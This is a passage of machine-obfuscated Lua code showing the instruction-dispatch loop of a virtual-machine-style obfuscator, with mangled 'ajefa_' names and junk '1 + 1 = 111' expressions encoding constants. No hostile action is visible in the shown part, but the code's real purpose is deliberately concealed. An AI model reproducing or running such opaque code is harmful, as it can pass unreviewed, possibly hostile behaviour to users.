111";}];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("FL")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("tOK")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("3r")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("po1")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("TmUL")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";"1 + 1 = 111";}]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{{252;367;42;204};"1 + 1 = 111";"1 + 1 = 111";}]][ajefa_lllIIlIllIlIllllIIlIIlll[#("Kqob")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("r8")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("LXv")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("Eud7")]];else ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("uA")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("mrD")]][ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("cPAI")]]];end;elseif ajefa_IIIlIllIllllIIllIlllIIll<=#("vUVYHMFOVGAubaO31g7v91aVl10oXhjpCyd3")then ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("xP")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("sZU")]]*ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("m2CW")]];elseif ajefa_IIIlIllIllllIIllIlllIIll>#("QsQXuY96abjsmIgsCGFTaMPVp0Nvk3O6VskXq")then ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("b5")]][ajefa_lllIIlIllIlIllllIIlIIlll[#{{117;492;7;563};"1 + 1 = 111";{83;73;602;770};}]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("OZlf")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("lo")]]=ajefa_IllIllll[ajefa_lllIIlIllIlIllllIIlIIlll[#("J5K")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("eQ")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("r86")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("K4e3")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("4V")]]=ajefa_IllIllll[ajefa_lllIIlIllIlIllllIIlIIlll[#("ltS")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("5z")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("uvg")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("ksja")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("GG")]]=ajefa_IllIllll[ajefa_lllIIlIllIlIllllIIlIIlll[#("OFQ")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("J1")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("Oz1")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("zqXr")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("MP")]]=ajefa_IllIllll[ajefa_lllIIlIllIlIllllIIlIIlll[#("sOH")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("VF")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("4Km")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("iN2i")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";{463;841;180;572};}]]=ajefa_IllIllll[ajefa_lllIIlIllIlIllllIIlIIlll[#("CgE")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("yQ")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("0Ad")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("jQvf")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("hQ")]]=ajefa_IllIllll[ajefa_lllIIlIllIlIllllIIlIIlll[#("0Np")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("7s")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("K1o")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("1U8a")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("0Y")]]=ajefa_IllIllll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Sxv")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Dz")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("35g")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("UfjM")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("vx")]]=(ajefa_lllIIlIllIlIllllIIlIIlll[#("dVZ")]~=0);ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IllIllll[ajefa_lllIIlIllIlIllllIIlIIlll[#("BCY")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("eY")]];else ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("KY")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("hbj")]]*ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Kqkz")]];end;elseif ajefa_IIIlIllIllllIIllIlllIIll<=#("PcaZlZQ6LJd792JjKeO4HEkNWgynH3ytb30CSlAZe")then if ajefa_IIIlIllIllllIIllIlllIIll<=#("pdsn3WyLSfjxbl2yceCDzRlT5gbgBzOYZnnguJn")then local ajefa_IlIIIlIIIIlIIlllI;local ajefa_IIIlIllIllllIIllIlllIIll;ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("dA")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("2vH")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("TGAx")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("uB")];ajefa_IlIIIlIIIIlIIlllI=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Bcb")]];ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll+1]=ajefa_IlIIIlIIIIlIIlllI;ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_IlIIIlIIIIlIIlllI[ajefa_lllIIlIllIlIllllIIlIIlll[#("6ekB")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("TN")]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll+1])ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("1G")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";{742;542;708;511};"1 + 1 = 111";}]][ajefa_lllIIlIllIlIllllIIlIIlll[#("b7cL")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";{574;224;530;187};}]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("ALW")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("ZJ")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("oTW")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("3I87")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("dS")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("atR")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";"1 + 1 = 111";}]]=ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";}];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Cz")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("YPW")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Dx")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("Rad")];elseif ajefa_IIIlIllIllllIIllIlllIIll==#("06krjP2PKuiuyM4J1JrWUqktCvHX8VcD1ZNDG4Jq")then local ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lllIIlIllIlIllllIIlIIlll[#{{908;248;597;213};{678;191;12;610};}]ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll]()else local ajefa_lIIIIIlIllIlllllllIIll=ajefa_lllIlllllIIlI[ajefa_lllIIlIllIlIllllIIlIIlll[#("Zhc")]];local ajefa_IlIIIlIIIIlIIlllI;local ajefa_IIIlIllIllllIIllIlllIIll={};ajefa_IlIIIlIIIIlIIlllI=ajefa_lIIllIIIIIllIlIlllllII({},{__index=function(ajefa_IlIIIlIllIlIlllIlIlIllll,ajefa_lllIIlIllIlIllllIIlIIlll)local ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_IIIlIllIllllIIllIlllIIll[ajefa_lllIIlIllIlIllllIIlIIlll];return ajefa_lllIIlIllIlIllllIIlIIlll[1][ajefa_lllIIlIllIlIllllIIlIIlll[2]];end,__newindex=function(ajefa_lIlllIll,ajefa_lllIIlIllIlIllllIIlIIlll,ajefa_IlIIIlIllIlIlllIlIlIllll)local ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_IIIlIllIllllIIllIlllIIll[ajefa_lllIIlIllIlIllllIIlIIlll]ajefa_lllIIlIllIlIllllIIlIIlll[1][ajefa_lllIIlIllIlIllllIIlIIlll[2]]=ajefa_IlIIIlIllIlIlllIlIlIllll;end;});for ajefa_IlIIllIIIl=1,ajefa_lllIIlIllIlIllllIIlIIlll[#("BujH")]do ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;local ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];if ajefa_lllIIlIllIlIllllIIlIIlll[#("S")]==82 then ajefa_IIIlIllIllllIIllIlllIIll[ajefa_IlIIllIIIl-1]={ajefa_lIlllIll,ajefa_lllIIlIllIlIllllIIlIIlll[#("4fb")]};else ajefa_IIIlIllIllllIIllIlllIIll[ajefa_IlIIllIIIl-1]={ajefa_IllIllll,ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";}]};end;ajefa_IIIlIlIlIlIllIIllIIIIlII[#ajefa_IIIlIlIlIlIllIIllIIIIlII+1]=ajefa_IIIlIllIllllIIllIlllIIll;end;ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Fe")]]=ajefa_lIIIllIlIIIIIllIlII(ajefa_lIIIIIlIllIlllllllIIll,ajefa_IlIIIlIIIIlIIlllI,ajefa_IlIIllIIIl);end;elseif ajefa_IIIlIllIllllIIllIlllIIll<=#("vHfpsAntOoVrC1JV1ZYheRZsQEI8Bd79aHzUfdj5tE")then local ajefa_IIIlIllIllllIIllIlllIIll;local ajefa_IlIIllIIIl;ajefa_IlIIllIIIl=ajefa_lllIIlIllIlIllllIIlIIlll[#("sN")];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Pqx")]];ajefa_lIlllIll[ajefa_IlIIllIIIl+1]=ajefa_IIIlIllIllllIIllIlllIIll;ajefa_lIlllIll[ajefa_IlIIllIIIl]=ajefa_IIIlIllIllllIIllIlllIIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("thkv")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Mg")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("pOm")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IlIIllIIIl=ajefa_lllIIlIllIlIllllIIlIIlll[#("XL")]ajefa_lIlllIll[ajefa_IlIIllIIIl]=ajefa_lIlllIll[ajefa_IlIIllIIIl](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IlIIllIIIl+1,ajefa_lllIIlIllIlIllllIIlIIlll[#("OCN")]))ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("T1")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{{143;905;634;733};"1 + 1 = 111";"1 + 1 = 111";}]][ajefa_lllIIlIllIlIllllIIlIIlll[#("2DEQ")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];if(ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("1p")]]==ajefa_lllIIlIllIlIllllIIlIIlll[#("Nq8O")])then ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;else ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_lllIIlIllIlIllllIIlIIlll[#("lRU")];end;elseif ajefa_IIIlIllIllllIIllIlllIIll>#("Gqlz8dSOfVikPRXKY1o2KrVq4DZQXQ3YKxsbEfK5Tz1")then local ajefa_IIIlIllIllllIIllIlllIIll;ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("QG")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("HzS")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("WKII")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("UA")]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IIIlIllIllllIIllIlllIIll+1,ajefa_lllIIlIllIlIllllIIlIIlll[#("R5M")]))ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("92")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("sLK")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("XcIx")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";"1 + 1 = 111";}]][ajefa_lllIIlIllIlIllllIIlIIlll[#("lvT")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{{831;894;911;818};"1 + 1 = 111";"1 + 1 = 111";{625;46;738;252};}]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Wa")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("sys")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";"1 + 1 = 111";{567;698;659;429};{944;912;795;494};}];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("n9")]][ajefa_lllIIlIllIlIllllIIlIIlll[#{{985;225;495;371};"1 + 1 = 111";{848;864;439;748};}]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("Y3ZQ")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("BH")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("Eb9")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("JDvZ")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("uB")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("3I4")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("MKt7")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("10")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("NZs")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("1XLe")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("zS")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("JpR")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("qJYr")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("JM")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("bsq")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Xl")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{{918;451;141;223};"1 + 1 = 111";{3;18;583;125};}]][ajefa_lllIIlIllIlIllllIIlIIlll[#("KpWP")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("VV")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("2Pk")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("as")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("yQL")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("1b")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{{458;769;879;403};"1 + 1 = 111";"1 + 1 = 111";}]][ajefa_lllIIlIllIlIllllIIlIIlll[#("qxcG")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("4a")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("5ub")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("2V28")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("kG")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("RUK")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("tQTV")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIll